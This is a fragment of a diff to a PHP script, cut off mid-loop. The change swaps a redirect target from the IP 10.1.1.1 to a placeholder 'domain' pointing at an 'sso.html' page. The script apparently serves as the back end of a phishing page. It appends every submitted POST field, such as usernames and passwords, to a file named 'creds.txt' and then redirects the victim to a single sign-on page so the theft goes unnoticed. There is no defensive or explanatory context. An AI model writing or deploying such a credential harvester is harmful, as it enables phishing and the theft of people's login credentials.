@@ -1,5 +1,5 @@
 <?php
-header ('Location:http://10.1.1.1/sso.html');
+header ('Location:http://domain/sso.html');
 $handle = fopen("creds.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
